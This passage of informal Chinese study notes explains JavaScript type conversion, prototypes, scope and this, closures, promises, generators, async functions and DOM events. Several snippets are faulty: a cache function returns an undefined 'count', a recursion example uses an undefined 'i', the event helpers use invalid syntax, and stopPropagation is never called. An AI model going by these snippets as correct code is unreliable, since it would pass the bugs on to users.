		     III: 必须手动执行 $.removeData() 方法才能删除掉相关联的数据
		
		weakMap轻松解决：
		
			let wm = new WeakMap(), ele = document.querySelector(".element");
			wm.set(ele, "data");

			let value = wm.get(ele);
			console.log(value);

			ele.parentNode.removeChild(ele);
			ele = null;/*弱引用自动被回收*/
		
		b. 数据缓存
		
		     我们需要关联对象和数据「非原有对象上」，但不想管理这些数据的死活
		
			const cache = new WeakMap();
			function countOwnKeys(obj) {
			    if (cache.has(obj)) {
				return cache.get(obj); /*读取存储属性*/
			    } else {
				const data = Object.keys(obj).length;
				cache.set(obj, data);/*弱引用*/
				return count;
			    }
			}

	       
		
							
							
一、 类型转换

      隐式转换：x + ''[String(x)] | + x[Number(x)] | !!x[Boolean(x)]
      进制转换：1. var x = 110;  x.toString(2); 10进制转2进制   2. var x='110';  parseInt(x,2); 2进制转10进制
	
        从 '==' 运算 开始了解类型转换
        万物皆数，在转化过程中，所有类型的值都有一种向 Number 转化的趋势!!最后都是转换为 Number 比较
      
        1. 有和无世界 （String、Number、Boolean、Object）
	   相同的 String：x 与 y 都是 String时，当 x、y 是完全相同的字符序列时，返回 true
	
		(1) Object --> ToPrimitive（注意：Date 类型的对象调用顺序相反）
		
		    a. obj.valueOf() [返回最适合该对象类型的原始值]
		    
		         I. 基本包装对象： 返回 primitive    
		         II. 其他：返回对象本身	     
		    	
		    	 result = primitive ？ result : toString(result)
			
		    b.toString() [返回对象的字符串表示（[object Type]）

		      I. arr.toString：返回一个字符串，',' 分隔每个数组元素
		      II. func.toString：返回表示函数源码的字符串
		      
		    	result = primitive ? result : throw Exception
			
		(2)Boolean --> ToNumber
		
		   Number(boolean)
		   规则：这一点也不需浪费过多口舌。想一下在C语言中，根本没有布尔类型，通常用来表示逻辑真假的正是整数1和0。
		   
		   false: ±0 、NaN、null、undefined、''
		
		(3)String --> ToNumber
		
		   Number(str)
		   规则：规范中描述得很复杂，但是大致说来，就是把字符串两边的空白字符去掉，然后把两边的引号去掉 
		   => result = num ? num : NaN 	 
		   
		   例外: 空白字符串
		   => Number('') // 0
		      Number('\r\n\t') // 0

			

	2. 空和空世界（undefined == true）
	   两个世界任意值做 '==' 比较为 false 是很容易理解的


二、原型与原型链

	1. prototype
	   其实，函数的 prototype 属性指向了一个对象, 这个对象正是调用该构造函数而创建的实例的原型, 也就是这个例子中的 person2 的原型。
	 
	      栗子：
	      
		function Person() { }
		Person.prototype.name = 'Kevin'; // 虽然写在注释里，但要注意：prototype是函数才会有的属性
		Person.prototype.constructor === Person // 每个原型都有一个 constructor 属性指向关联的构造函数
		var person2 = new Person();
		console.log(person2.name) // Kevin
	
	
	2. __proto__
	   每一个 Js 对象(null 除外), 在创建的时候就会与之关联另一个对象, 这个对象就是我们所说的原型
	 
	    (1) new 的模拟实现
	          __proto__会指向该对象的原型
		  
		   _proto_：非标准的方法访问原型，然而它并不存在于 Person.prototype 中，实际上，它是来自于 Object.prototype。
		   与其说是一个属性，不如说是一个 getter/setter，当使用 obj._proto_时，可以理解成返回了 Object.getPrototypeOf(obj)。
		   
	3. 原型链
	     
	     (1) prototype 怎么和指向相关的呢？
	     
	           prototype 只不过是一个属性而已，它没有什么实际的意义，最后能做 '原型链继承' 的还是通过__proto__这个 '原型指针' 来完成的 
		   
		   实际在找寻继承的属性的时候，会通过 '__proto__原型指针' 一层一层往上找，即会去找 '__proto__原型指针' 的指向


	         
	     
	   
		  
		  
		  
		  
		  


	
	    
	    (2) 真的是继承吗？
	        每一个对象都会从原型"继承"属性
	        
		继承意味着复制操作，然而 Js 默认并不会复制对象的属性，相反 Js 只是在两个对象之间创建一个关联，委托的说法更准确一些
		
		
	    (3) constructor
	        (1) 每个原型都有一个 constructor 属性指向关联的构造函数
	        
			  function Person() {}
			  console.log(Person === Person.prototype.constructor); // true
		  
		  实例 constructor 属性：
		         // 当不能读取到constructor 属性时，会从 person 的原型也就是 Person.prototype 中读取
		 	 person.constructor === Person.prototype.constructor
		  
		  		
		(2) 我们用字面量对象重写原型的时候，会将 constructor 指向 Object()
		    
		        // 本质上重写了默认的 prototype 对象，因此 constructor 变成了新对象的 constructor
		    	Person.prototype = {
			    getName: function () {
				console.log(this.name);
			    }
			};

	    
	    
	    
	   2.3 原型的原型
	   
	       (1) 前边已经说了 prototype 属性指向了一个对象，既然是对象，我们就可以用最原始的方式创建它。
	            => 创建自定义构造函数，其原型对象默认只会取得 constructor 属性，其他方法默认都是从 Object 继承而来
	   	
			var obj = new Object();
			原型.__proto__ === Object.prototype // true
			Object.prototype.__proto__ === null // true
		
		Object.prototype._proto_ == null 和 Object.prototype 没有原型 [同一个意思]
		
		
		(2) 继承的多种方式
		
		    instanceof: 判断一个实例是否属于某种类型
		    
		    a. 实现：在左边变量原型链上寻找隐式原型是否等于右边变量的显示原型
		   
			
			function instanceof(left, right) {
			  let rightProto = right.prototype; // 取右边 prototype 值
			  left = left.__proto__; // 取左边__proto__值
			  while (true) {
			    if (left === null) {
				  return false;	
			      }
			      if (left === rightProto) {
				  return true;	
			      } 
			      left = left.__proto__ 
			  }
			}
			
			
		    b. ez 区分其他函数与 Object()
		    
			   => Object instanceof Object 
			   
			   一般函数：函数.__proto__ === Function.prototype
			   Object：Function.prototype ===  Object.prototype

	
	
	3. 至于为什么Function.__proto__ === Function.prototype
	   函数既是函数又是对象
	
	      (1) 有两种可能
	      	  a. 是为了保持与其他函数一致（）
		     函数除了拥有__proto__属性之外，还拥有 prototype 属性。函数.__proto__ === Function.prototype
	             
		  
	          b. 简单的说，我认为：就是先有的 Function（内置对象），然后实现上把原型指向了 Function.prototype
	             但是我们不能倒过来推测因为Function.__proto__ === Function.prototype，所以Function调用了自己生成了自己。
	
	
	 
三、执行上下文
   函数被调用时，执行上下文被创建

     每当 Js 引擎执行 ECMAScript 可执行代码的时候，就会进入到一个执行上下文，如何管理这么多执行上下文呢？
	
	
	 * 执行上下文栈：Js 引擎创建了执行上下文栈（Execution context stack，ECS 来管理执行上下文）
	     工作原理见Event Loop
	     
	
 	 * 变量对象 与 this 在进入执行上下文时初始化 [延长作用域链]
	   作用域链在静态分析初始化
	   
	    
	      1. 变量对象(Variable object，VO)
	      	 是与执行上下文相关的数据作用域，存储了在上下文中定义的变量和函数声明
		 
		 全局上下文变量对象：全局对象
		 
		 (1) 函数上下文
		       Js 引擎会进行静态分析：变量对象的创建过程即变量提升的过程
		     
		   !很重要
		     变量对象是规范上的或者说是引擎实现上的，只有进入到一个上下文中变量对象才会被激活，所以叫 activation object 呐(AO),
		     在进入函数上下文时创建，通过函数 arguments 属性初始化，arguments 属性值是 Arguments 对象
		     
		     Arguments 对象是执行上下文相关的数据作用域呐
		     

			
			 a. 静态分析阶段：
			 
			      1. 建立 arguments 对象，检查当前上下文 形参，建立 <形参属性: 属性值>			      
			      2. 函数声明, ...
			      3. 变量声明, ...
			      
				arguments: {/*arguments 对象*/
				  0: 1,
				  length: 1
				},
			      
			 b. 代码执行阶段：在代码执行阶段，会再次修改变量对象的属性值
			    
			        /**
				 * foo();
				 *  => Uncaught ReferenceError: a is not defined
				 *  "a" 未进行 var 变量声明
				 */
				function foo() {
				  console.log(a);
				  a = 1;
				}

			
	       2. 作用域链(Scope)
	          由多个执行上下文的变量对象构成的链表就叫做作用域链
		  
	            当查找变量的时候，会先从当前上下文的变量对象中查找，如果没有找到，就会从父级上下文的变量对象中查找，直找到全局对象。
	                        
		      伪代码：函数有内部属性			       
		      
			  (1) 函数创建
			      作用域：规定了如何查找变量，也就是确定当前执行代码对变量的访问权限
			      
			      a. 词法作用域与动态作用域
			    	 Js 静态作用域：函数的作用域在函数定义的时候就决定了
				 	
				       /**
					* 动态作用域：从调用函数的作用域查找
					* 1. 如果 Js 是动态作用域，会打印2
					*/
				 	var value = 1;

					function foo() {
					    console.log(value);
					}
					function bar() {
					    var value = 2;
					    foo();
					}
					bar();
				 
				
				foo.[[scope]] = [ globalContext.VO ] // 函数先 copy 当前所在上下文作用域链

			  (2) 函数激活

				当函数激活时，进入函数上下文，创建 VO/AO 后，就会将活动对象添加到作用链的前端。
			
				Scope = [barContext.AO].concat([[Scope]]) // 添加活动对象
			  
			  (3) 延长作用域链 
			      1. with  2. try..catch
			   	
			      with:
			        (1) with 语句块会现在指定对象中查找，查找其他变量对象很慢
				(2) 不明确的语义...栗子如下：
				
				       function f(x) {
					  with (o) {
					    print(x);
					  }
					}

			   	try {
				  // ..
				} catch (error) {} // error 会被添加到作用域链前端
			  
			  (3) eval
			      1. "use strict" -> 自己的 scope 下
			      2. * 直接调用 -> 修改当前 scope
			         * 间接调用 -> 在全局作用域执行 [修改全局 scope]
				    
	      
	        3. this
	           和函数在哪定义无关，而和函数怎么调用有关
		  
		  -- 改变 this 的指向
		     [new]、[apply, call, bind]、[箭头函数]
		     
	      
	          3.1 难点：函数调用（Function Calls）
		      this 是在函数被调用的时候确定的
		  
		      Reference: 存在于规范里的抽象类型。规范这个就可以说是给定了 Js 所用值的大致数据结构。
		     	
			     栗子：	  
				var foo = {
				  value: 2,
				  bar: function () {
				    return this.value;
				  }
				}
				foo.bar()

			   此时 bar 对应的 Reference 为：
			   
				var barReference = {		
				  base: foo,
				  name: 'bar',		
				  strict: true	
				}
		      
		      (1) 获取 Reference 组成部分的方法 
		      
		          * GetBase(): 返回 reference 的 base value [属性所在的对象 | EnvironmentRecord]
			  * IsPropertyReference(): 如果 base value 是一个对象，就返回true
			  
		      (2) 获取 Reference 对应值
		           
			   * GetValue: 返回具体值非 reference 类型
			  
		    
		    规范：Function Calls 的 this
		    
		      计算 MemberExpression 的结果赋值给 ref
		      ref = MemberExpression [ 简单理解就是函数调用 '()' 左边部分 ]

				1.1 如果 ref 是 Reference，并且 IsPropertyReference(ref) 是 true, 那么 this 的值为 GetBase(ref)
				1.2 如果 ref 是 Reference，并且 base value 值是 Environment Record, 那么 this 的值为 undefined
				1.3 如果 ref 不是 Reference，那么 this 的值为 undefined


	          3.2 this 指向
		  
		      * 全局上下文（任何函数外）： 指向 window
		      * 原型链上方法：调用方法的对象
		      * getter/setter：设置 / 获取属性的对象
		      * 构造函数：实例对象
		      * 事件回调：this 指向 DOM 元素
		      * 箭头函数：通过作用域链查找
		  
		  3.3 this 丢失问题
		  
		      setTimeout：
		      事件回调：this 不指向函数所在对象，指向 DOM
		  
		  3.4 一道加深理解的题目
		  
			  var number = 5;
			  var obj = {
			      number: 3,
			      fn: (function () {
				  var number;
				  this.number *= 2;
				  number = number * 2; // 声明 number 变量
				  number = 3;
				  return function () {
				      var num = this.number;
				      this.number *= 2;
				      console.log(num);
				      number *= 3; // 闭包
				      console.log(number);
				  }
			      })()
			  }
			  var myFun = obj.fn; // window.number = 10, number = 3（myFun.call 后变为9）
			  myFun.call(null); // 20：window.number*2, 9：number*3
			  obj.fn(); // 6：obj。number*2, 27：number*3
			  console.log(window.number); // 20
			
	      
四：闭包

	1. 什么是闭包
	   (1) 闭包 = 函数 + 函数能够访问的自由变量（非变量对象）

	   (2) 实践的角度, 以下函数才算是闭包：

	     I. 即使创建它的上下文已经销毁，它仍然存在（比如，内部函数从父函数中返回）
	     II. 在代码中引用了销毁函数的自由变量

	     栗子；

			var scope = "global scope";
			function checkscope(){
			    var scope = "local scope";
			    function f(){
				return scope;
			    }
			    return f;
			}
		    	/*checkscope 函数上下文已经被销毁了，怎么还会读取到 checkscope 作用域下的 scope 值呢*/
			var foo = checkscope();
			foo();


	    (3) 作用域链：

	       就是因为作用域链，f 依然可以读取到 checkscopeContext.AO 的值：

		     fContext = {
			Scope: [AO, checkscopeContext.AO, globalContext.VO]
		     }

	说明当 f 函数引用了 checkscopeContext.AO 中的值的时候，即使 checkscopeContext 被销毁了，但是 Js 依然会让 checkscopeContext.AO 	  活在内存中，f 函数依然可以通过 f 函数的作用域链找到它，正是因为 Js 做到了这一点，从而实现了闭包这个概念。


	   2. 闭包与作用域链

	        (1) 作用域链

		      for (var i = 0; i < 3; i++) {/*globalContext.VO*/
			  data[i] = function () {
			    console.log(i);
			  };
			}

		(2) 闭包
		    不传入 i 参数同样访问 globalContext

		      	for (var i = 0; i < 3; i++) {/*作用域链查找匿名函数*/
			  data[i] = (function (i) {
				return function() {
				    console.log(i);
				}
			  })(i);
			}		

	    闭包的缺陷：

		1.常驻内存会增大内存使用量，并且使用不当容易造成内存泄漏
		2.如果不是因为某些特殊任务而需要闭包，在没有必要的情况下，在其它函数中创建函数是不明智的。因为闭包对脚本性能具有负面影响，
		  包括处理速度和内存消耗



四：参数按值传递

	1. 高级程序设计
	   ECMAScript中所有函数的参数都是按值传递的

	   (1) 什么是按值传递呢？
	         把函数外部的值复制给函数内部的参数，就和把值从一个变量复制到另一个变量一样
		 
	   (2) 按值传递
	         
		 当传递 can 到函数 backtrack 中，相当于拷贝了一份 can 到形参 _can, 对内层 can 赋值完全不会影响外层递归函数的
		 
			var canJump = function (nums) {
			    var can = false
			    /**
			     * 这里也是一样的哦 
			     *  backtrack(nums, can, 0)
			     *  return can 
			     */
			    return backtrack(nums, can, i)/*正确*/

			  }
			  function backtrack(nums, can, end) {
			    /*if (end === nums.length-1) can = true 这里对 can 赋值是完全不影响外层递归 can 的结果的!*/
			    if (end === nums.length-1) return true/*正确*/

			    for (let i = end; i < nums.length; i++) {
			      if (nums[i] === 0) continue
			      while (i > 0) {
				i = i + nums[i]
				/*backtrack(nums, can, i) can 并没有改变*/
				can = backtrack(nums, can, i)/*正确*/
				if (can) break
				i--
			      }
			      if (can) break
			    }
			    return can
			  }
	   
	   
	   (3) 按引用传递？

		 拷贝虽然很好理解，但是当值是一个复杂的数据结构的时候，拷贝就会产生性能上的问题
		 	
			var obj = { value: 1 };
			function foo(o) {
			  o.value = 2;
			}
			foo(obj);
			console.log(obj.value) // 2
		 
		 哎，不对啊，连我们的高程都说了 ECMAScript 中所有函数的参数都是按值传递的，这怎么能按"引用传递"成功呢？
		 
	   (4) 按共享传递
	   		
			var obj = { value: 1 };
			function foo(o) {
			  o = 2;/*可以通过引用修改对象，但无法直接修改外层变量值*/
			}
			foo(obj);
			console.log(obj.value) // 1
			
		 在传递对象的时候，传递对象的引用的副本 [注意： 按引用传递是传递对象的引用，而按共享传递是传递对象的引用的副本！]
		 
		 因为拷贝副本也是一种值的拷贝，所以在高程中也直接认为是按值传递了
		 

		  
		  

五、类数组对象：

	1. 存在数值键名和 length 属性
	
		var arrayLike = {
		    0: 'name',     // arrayLike.push('4'); 然而代码会报错: arrayLike.push is not a function
		    1: 'age',      // 所以终归还是类数组呐……
		    length: 2
		}
	
			* 读写 
			   arrayLike[0] = 'new name';
			* 获取长度 
			   arrayLike.length
			* 遍历
			   for(var i = 0, len = arrayLike.length; i < len; i++) {
			       …… // iterator 线性结构
			   }
	
	2. 类数组用数组方法
	   既然无法直接调用，我们可以用 Function.call 间接调用

		var arrLike = {0: 'xy', 1: '15', length: 2 }

		Array.prototype.join.call(arrLike, '&'); // xy&15
		
		[].map.call(arrLike, function(item){
		    return item.toUpperCase(); // ["NAME", "AGE", "SEX"]
		}); 
		
		
		
	3. arguments 对象 -- 执行上下文的相关数据作用域
	
	     调用函数时，会为其创建一个 Arguments 对象，并自动初始化局部变量 arguments，代指 Arguments 对象。所有作为参数传入
	     的值都会成为Arguments对象的数组元素。
	   
           (1) 没有语法检查
	   
	         js 是不对函数传参个数进行语法检查的，所以如果实参 > 形参，我们是无法使用多出的参数的
	        （若没有实参，形参变量对象默认为 undefined！）
	   
	   
           (2) 属性 [非 'strict']
	       !记录栈内的调用信息
	       
	         * arguments.callee：被调用函数自身
		
                 * arguments.caller：调用者函数
		
		
           (3) arguments 和对应形参绑定
	   
	         传入的参数：值共享 ['strict' 模式不共享]
		 没有传入: 不共享
		 
		    栗子：
		    
		 	function foo(name, age, sex, hobbit) {
			  var args = arguments
			  // 对应
			  console.log(name, args[0]); 
			  name = 'new name';

			  // 不对应
			  sex = 'new sex';
			  console.log(sex, args[2]); // new sex undefined

			  args[3] = 'new hobbit';
			  console.log(hobbit, args[3]); // undefined new hobbit

			}
			foo('name', 'age')
	   


	       
        4. 将 arguments 类数组转化为数组的方法
	 	
		* Array.apply(null, arguments)
		* Array.from(arguments)
		* [...arguments]        
	
	
六、异步回调（如何解决回调地狱）
	
	一： promise
	    传统回调地狱：回调函数 、事件监听 、发布订阅
	   
	     1. promise 出现的原因？
	        回调地狱不是最糟糕的，主要是与人线性思考的逻辑相违背，以至于我们需要花很多精力思考真正的执行顺序
	        
		回调嵌套 + 难以复用中间环节
	      
		 (1) 调用第三方 API 时，因为某个错误回调执行多次/未执行
		       栗子：
		       
			       // 回调函数是否被执行取决于 buy 模块
				import {buy} from './buy.js';

				buy(itemData, function(res) {
				    console.log(res)
				});
		 
		       传统：不是线性逻辑也不是最糟糕的，还需要加入很多逻辑判断
		       
		       栗子：
				/**
				 * 回调
				 *
				 * doD() 必须在 doC() 完成后才能完成
				 *  1. 万一 doC() 执行失败了呢？我们是要重试 doC() 吗？还是直接转到其他错误处理函数中
				 *  2. 当我们将这些判断都加入到这个流程中，很快代码就会变得非常复杂，以至于无法维护和更新
				 */
				doA( function(){
				  doB();

				  doC( function(){
				      doD();
				  })
				});
				doE();
				// doA()
				// doE()
				// doB()
				// doC()
				// doD()
				
		       promise：
		         * promise 只能 resolve 一次
		         * Promise.race
			 
		 (2) 回调有时同步有时异步执行
		       传统：有缓存就读缓存，没有就发起请求 <- 这是绝对要杜绝的
		       promise：
		         * promise .then 实现为异步执行 [微任务队列]
		 
		 (3) promise 解决的痛点还有其他方法可以解决吗？
		     co 模块 [我很熟哦]、async/await
	     
	     
	     2. 什么是 promise？
		  是一个对象，可以获取异步操作的消息[提供了统一的API，不同的异步操作都可以用相同的方法处理]
		  
		  (1) promise 对象的状态
		  
		     1) 状态不受外界影响
		        pending、fulfilled、rejected
		     
		          * resolve() -- resolve 很少传递同步消息
			    pending -> fulfilled // promise对象 <resolved>
			    
			  * reject()
			    pending -> rejected // promise对象 <rejected>
		        
		     
		     
		     2) 状态只会改变一次
		     
		          const promise = new Promise(function(resolve, reject) {});
			  // => Promise {<pending>}

			  const promise = new Promise(function(resolve, reject) {
			    resolve('resolve')
			  });
			  // => Promise {<resolved>: "resolve"} [状态不会再改变]
		  

	     1. 其实 promise 很简单：记住这个就行
	        =>
	           I.resolve：改变 promise 状态
	           II.then：状态改变的回调


	   3. 错误被吃掉 
	        
		(1) 什么是错误被吃掉？
		    首先我们要理解，什么是错误被吃掉，不是指错误信息不被打印，而是 Promise 内部的错误不会影响到 Promise 外部的代码
		    
		       举个例子 1：
		       
			    // 因为 throw error 的缘故，代码被阻断执行，并不会打印 233
			    throw new Error('error');
			    console.log(233);

			再举个例子 2：
			    /**
			     * 代码依然会被阻断执行
			     * 出现了一个错误阻碍了正常 Promise 的构造，结果会得到一个立刻跑出的异常，而不是一个被拒绝的 Promise。
			     */
			    const promise = new Promise(null);
			    console.log(233);

			然而再举个例子 3：
			    /**
			     * 这次会正常的打印 233，说明 Promise 内部的错误不会影响到 Promise 外部的代码
			     * 而这种情况我们就通常称为 “吃掉错误”。
			     */
			    let promise = new Promise(() => {
				throw new Error('error')
			    });
			    console.log(233);
		      
		      其实这并不是 Promise 独有的局限性，try..catch 也是这样，同样会捕获一个异常并简单的吃掉错误
		    
		    
		(3) 值穿透
		    对于一个没有错误处理函数的 Promise 链，任何错误都会在链中被传播下去，直到你注册了错误处理函数。
		
		
		(4) .catch 的使用
		    Promise 链中的错误很容易被忽略掉，这也是为什么会一般推荐在 Promise 链的最后添加一个 catch 函数		
		    
		      .then(onFulfilled, onRejected), 不要使用 onRejected 参数
		    
		       1) .catch 更接近同步的写法，也可以捕获前边 .then() 方法执行错误
		   
		    


		
		
	        推荐：在链最后加一个 catch()
	   
	      Promise.prototype.catch == .then(null, rejection)
	   
	   		...
			sth.then(function() {
			  return sthElse(); /*无法捕获 sthElse 的异常*/
			}, function(err) {
			  handleError(err);
			});
			return;

			sth.then(function() {
			  return sthElse();
			})
			.catch(function(err) {
			  handleError(err);
			}

	
	一： generator
	    generator 函数是一个状态机，封装了多个内部状态
	    
	    1. 什么是状态机
	        
		 (1) es5 实现状态机 
		 
			// clock 函数就是一个状态机，一共有两种状态（Tick和Tock），每运行一次，就改变一次状态
			var tick = true;

			var clock = function () {
			  if (tick) console.log('Tick!')
			  else console.log('Tock!')

			  tick = !tick
			}
			
		 (2) generator 实现
		 
		     与 es5 相比，少了保存状态的外部变量，这样更简洁，更安全（状态不会被非法篡改）
		     => 不用保存因为他本身就是一个状态信息呐 [目前是否处于停滞状态]
			
			var clock = function* () {
			  while (true) {
			    console.log('Tick!');
			    yield;
			    console.log('Tock!');
			    yield;
			  }
			};
			
	    2. generator 基础
	         
		 (1) iterator
		      调用 generator 函数会返回一个遍历器对象（函数并没有执行）, 可以依次遍历 generator 函数内部的每一个状态
		 
		       function* gen() {
			  yield 'hello';
			  yield 'async';
			}
			var iterator = gen()
			
			
		 (2) yield -- 惰性求值
		     generator 提供了可暂停执行的函数。yield 表达式就是暂停标志
		     
		       1. 遇到 yield，暂停执行
		          => return {value: yield 表达式的值，done: false}
			  
		       2. 执行最后 
		          => {value: return语句 ? return 的值 : undefined，done: true}
		     
		     
		 (3)  iterator.next()
		      yield 表达式本身没有返回值（返回 undefined）, next() 参数被当做 上一个 yield 返回值
		        
		      第一个next方法用来启动遍历器对象，所以不用带有参数
		     
				function* foo(x) {
				  var y = 2 * (yield (x + 1));
				  var z = (y / 3);
				}

				var a = foo(5);
				a.next() // {value:6, done:false}
				a.next() // {value:NaN, done:true} => undefined/3

				var b = foo(5);
				b.next() // { value:6, done:false }
				b.next(12) // { value:8, done:true } => 36/3
				
				
		  (4)  yield* 表达式
		       可以遍历任意部署了 iterator 接口的数据结构，（generator 在没有 return 时）相当于部署了一个 for..of 循环
		       [!不要纠结为什么可以传入 Iterator]
		       
		       
		           普通线性结构：
		              nextIndex：线性结构位置 
			      => {value: arr[nextIndex++], done: false}
		 	
		           generator
		              yield：中断语句的位置
			      => {value: yield表达式的值, done: false}      
		     
						
		  (5) this 与 执行上下文
		      iterator 是 generator 函数的实例
		        
			I. 没有 this
			
			        function* g() { this.name = 'xy' }

				g.prototype.hello = function () {
				  console.log('hello gen')
				};

				let obj = g()/*返回的总是 iterator 对象*/

				obj instanceof g // true
				obj.hello() // 'hello gen'
				
				/*解决 this 问题*/
				let obj = {}
				var iterator = g.call(obj)
				
		     
		     II. 执行上下文
		     
		           generator 产生的上下文环境，一旦遇到 yield 命令，就会暂时退出堆栈，但是并不消失，里面的所有变量和对象会冻结在
			   当前状态。等到对它执行 next() 时，这个上下文环境又会重新加入调用栈，冻结的变量和对象恢复执行。
		     
			


	    3. generator 异步任务自动执行
	       同步任务 -> yield*
	       异步.. -> 如何将 g.next() 放入异步回调中自动执行?
	       forOf() 替换为 next() 递归调用
	        
		 (1) promise 的自动执行
		     
			run(gen);
			function* gen() {
			  var r1 = yield Promise.resolve('1')
			  var r2 = yield Promise.resolve('2')
			}
			
			function run(gen) { /*自动执行函数*/
			    var g = gen();

			    function next(data) {
			      var result = g.next(data);

			      if (result.done) return;

			      result.value.then(function (data) {
				next(data);
			      });
			    }
			    next();
			}
			
		 (2) 回调函数的自动执行
			
			function fetchData(url) {
			    return function (cb) {
			      setTimeout(function () {
				cb({ status: 200, data: url })
			      }, delay)
			    }
			  }
			function* gen() {
			    var r1 = yield fetchData(data);
			    var r2 = yield fetchData(data);
			  }

			function run(gen) {
			  var g = gen();

			  function next(data) {
			    var result = g.next(data);

			    if (result.done) return;

			    result.value(next);/*next作为回调函数的参数*/
			  }
			  next();
			}
			run(gen)
	   
		
		(3) co，一个小模块，用于 generator 函数自动执行
		    
		    var co = require('co');
		    co(gen)



	二： async
	    在异步处理上，async 函数就是 generator 函数的语法糖
	    
	    1. async 函数的实现原理
	        
		 将 generator 函数和自动执行器，包装在一个函数里
		   也可以理解为 async 函数是基于 Promise 和 generator 的一层封装
		 
			async function fn(args) {
			  // ...
			}

			// 等同于

			function fn(args) {
			  return co(function* () {
			    // ...
			  });
			}
			
	    2. async 地狱
	    
	       贪图语法的简洁，让本来可以并发的内容变为了顺序执行 [并发执行 async 函数 ]
	       
	         栗子：
	       	       (async () => {
			  const listPromise = await getList();
			  const anotherListPromise = await getAnotherList();

			  // do something

			  await submit(listData);
			  await submit(anotherListData);
			})();
			
			(1) getList() 和 getAnotherList() 其实并无依赖
	       		(2) submit(listData) 需要在 getList() 之后，submit(anotherListData) 需要在 anotherListPromise() 之后


		a. 将互相依赖的语句包裹在 async 函数中
		
			async function handleList() {
			  const listPromise = await getList();
			  // ...
			  await submit(listData);
			}

			async function handleAnotherList() {
			  const anotherListPromise = await getAnotherList()
			  // ...
			  await submit(anotherListData)
			}

		b. 
		
			// 方法一
			(async () => {
			  const handleListPromise = handleList()
			  const handleAnotherListPromise = handleAnotherList()
			  await handleListPromise
			  await handleAnotherListPromise
			})()

			// 更好的实现
			(async () => {
			  Promise.all([handleList(), handleAnotherList()]).then()
			})()
	    
	    
		 (2) 并发执行 async
		 
		       a. 
				 
			    栗子：给定一个 url 数组，实现接口的并发
			    
				 async function loadData(urls) {
				    // 并发读取 url
				    urls.map(async url => {
				      await fetch(url);
				    });
				  }
				  
			  II. 使用 Promise.all()：

				  (async () => {
				    Promise.all([getList(), getAnotherList()]).then(...);
				  })();
				};
		
		
	    2. generator 基础



 
七、前端事件流
   Js 与 html 之间的交互是通过事件来实现的
   
     * 不支持冒泡事件：
         * 鼠标事件：mouserleave  mouseenter
         * 焦点事件：blur focus
         * UI事件：scroll resize
   
     * 事件：文档或窗口 特定的交互瞬间
     * 设计模式：可以用监听器（处理程序）来触发事件 [观察者模式]

     
   DOM2 级已经尝试以符合逻辑的方式来标准化 DOM事件  
     
     
	1. 观察者模式
	   页面行为（Js）与页面外观（html与css）之间的松散耦合
	   
   
	2. 事件流：文档接收事件的顺序
	     
	     在 click 按钮的同时，也点击了按钮的 container 容器，甚至也 click 了整个页面
	     
	     Q：第四代浏览器，页面的哪一部分会拥有某个特定的事件
	     
	     A：* IE：事件冒泡
	        * Netscape：事件捕获
		
	
	     A：DOM2 事件：规定事件流包括 3 个阶段 [事件捕获阶段、目标事件阶段、事件冒泡阶段]
	
	        * 事件委托的雏形是由事件冒泡来形成的一个通知链
	
	    1) 捕获：
	    
	    	不太具体结点应该先接受到事件，而最具体的节点应该最后接受到事件
	      
	      
	    2) IE 事件流：
	    
	    	* 目标阶段：
	           * !重要 最具体节点（eg: <div>）在捕获阶段不会接收到事件
			
		        事件在 <div> 上发生，并在事件处理中看成冒泡阶段的一部分
			     
			     
	    	* 冒泡：
	           * 事件开始由文档结构嵌套最深的节点（div）接收
		   
		        然后逐级沿 dom 树向上传播到较为不具体节点（最终是文档节点 document、window）
		  
	   	 栗子：假如你点击了 <div> 元素
	    
			<body>
			  <div class="myDiv"></div>
			</body>
			
	   	 * window(IE 5.5 不支持) -> document -> html -> body -> div
	   	 * div -> body -> html -> document -> window(IE 5.5 不支持)
	     
	    

		  
		  
	3. 事件对象
	   无论 DOM 事件处理程序（DOM0 or DOM2），在触发事件时，会传入 event 对象
	   
	    
	
	     (1) 属性
	         * target：事件的目标
		   => srcElement：IE
		 
		 * currentTarget：处理事件的元素 [事件代理的元素]
		     == 事件处理程序 this
	     
	     (2) 方法
	         * preventDefault()：阻止默认行为
		   => returnValue：IE [属性: Boolean]
		   
	         * stopPropagation()：阻止事件在 dom 层次中的传播（捕获、冒泡）
		   => cancelBubble: IE [属性: Boolean]
		 
	         * stopImmediatePropagation()：阻止冒泡并阻止事件其他监听器的调用
		 
	     (3) IE 中事件对象
	         
	           I. window 的一个属性 [window.event]

		        // event 对象作为 window 的一个属性存在, 不作为参数传入
		        var btn = document.getElementById('btn')
			btn.onclick = function() {
			  var event = window.event
			}
		      
		   II. 作为参数
		     	// event 此时仍作为 window 的一个属性
		        btn.attachEvent('onclick', function (event) {})
			
		   III. 属性 [IE 不支持事件捕获]
		         * returnValue：阻止默认行为
			 
		         * cancelBubble：阻止冒泡
			 
		   兼容事件对象：
		   
			 function myEvent() {
			  getEvent (event) {
			    return event ? event : window.event
			  }
			  getTarget (event) { // 区分 currentTarget
			    return event.target || event.srcElement
			  }
			  preventDefault (event) {
			    if (event.preventDefault) {
			      event.preventDefault()
			    } else {
			      event.returnValue = false
			    }
			  }
			  stopPropagation (event) {
			    if (event.stopPropagation) {
			      event.stopPropagation
			    } else {
			      event.cancelBubble = true
			    }
			  }
			}
   
     
     	4. 触发事件的方式
	
	   (1) 内联事件处理程序
	    
	   	/**
		 * 处理程序代码：有权访问全局作用域中任何代码
		 *
		 * 1. html 元素刚出现就触发了事件，但未加载事件处理程序 js
		 * 2. html 与 js 耦合太重
		 * 3. 作用域链在不同浏览器结果不同
		 */
		<input type="button" onclick="alert('val');"></input>
		
	   
	   (2) JS 事件处理程序
	   
	        1) 每个元素（document 与 window）都有自己的事件处理程序
	       
	        /**
		 * DOM0 级事件处理程序
		 *  1. 元素的方法 [this 指向当前元素]
		 *  2. Js 加载后才能触发事件
		 */
		var btn = document.getElementById('btn')
		btn.onclick = function() {}
		btn = null // 删除事件处理程序
	   
	   
	        2) 监听器
		
		/**
		 * (type, listener[, useCapture])
		 *
		 *  DOM2 级事件处理程序
		 *   1. 可以绑定多个事件处理程序
		 *   2. removeEventListener  移除事件处理程序 [注：所有参数必须相同]
		 */
		btn.addEventListener('click', function () {}, false)
		btn.removeEventListener('click', function () {}, false)
		
		
		兼容性事件处理程序：
		  要保证处理事件代码在大多数浏览器下可以一致运行，只需关注冒泡阶段
		  
			function addEvent() {
			  addHandler (el, type, handler) {
			    if (window.addEventListener) {
			      el.addEventListener(type, handler, false)
			    } 
